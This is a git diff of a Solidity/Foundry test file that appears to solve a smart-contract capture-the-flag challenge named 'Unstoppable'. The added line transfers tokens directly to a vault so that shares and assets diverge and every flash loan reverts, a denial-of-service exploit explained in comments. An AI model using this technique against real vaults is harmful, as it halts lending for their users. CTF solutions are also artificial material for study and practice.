@@ -92,8 +92,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        uint256 t = vault.end() + 1;
-        vm.warp(t);
+        // Directly transfer instead of `Deposit`
+        // Make share unchanged and make asset changed
+        // Finally, share is not equal to asset and all flashload txs will revert 
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
